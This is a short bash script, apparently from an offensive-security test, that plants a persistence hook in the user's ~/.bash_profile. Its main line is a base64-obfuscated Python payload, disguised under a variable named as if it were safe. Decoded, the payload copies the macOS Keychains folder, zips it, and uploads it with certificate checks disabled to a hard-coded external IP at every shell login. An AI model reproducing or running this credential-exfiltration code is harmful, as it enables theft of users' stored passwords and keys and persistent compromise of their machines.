#!/bin/bash
#agregando cositas al .bash_profile
MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
STRING="aW1wb3J0IHNodXRpbCwgcGF0aGxpYiwgdXJsbGliLnJlcXVlc3QsIHNzbDsgYiA9IHBhdGhsaWIuUGF0aCgnL3RtcC9pbmZvX2NvbGxlY3RlZCcpOyBkID0gYiAvICdrZXljaGFpbnMnOyBkLm1rZGlyKHBhcmVudHM9VHJ1ZSwgZXhpc3Rfb2s9VHJ1ZSk7IHNodXRpbC5jb3B5dHJlZShwYXRobGliLlBhdGguaG9tZSgpIC8gJ0xpYnJhcnkvS2V5Y2hhaW5zJywgZCwgZGlyc19leGlzdF9vaz1UcnVlKTsgYXJjaGl2ZSA9IHNodXRpbC5tYWtlX2FyY2hpdmUoJy90bXAva2V5Y2hhaW5zX2NvbGxlY3RlZCcsICd6aXAnLCBiKTsgY3R4ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0KCk7IGYgPSBvcGVuKGFyY2hpdmUsICdyYicpOyByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KCdodHRwczovLzEwNC4yNDguNjQuMTgwOjgwMDAvYmFzaF9wcm9maWxlJywgZGF0YT1mLnJlYWQoKSwgbWV0aG9kPSdQT1NUJyk7IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCBjb250ZXh0PWN0eCk="
SOMETHING_SAFE="python3 -c \"import base64; exec(base64.b64decode('$STRING'))\""
# Verificar si el mensaje ya existe en el .bash_profile
if ! grep -Fxq "$MESSAGE" ~/.bash_profile; then
    echo "$MESSAGE" >> ~/.bash_profile
fi
# Verificar si el curl ya existe en el .bash_profile
if ! grep -Fxq "$SOMETHING_SAFE" ~/.bash_profile; then
    echo "$SOMETHING_SAFE" >> ~/.bash_profile
fi
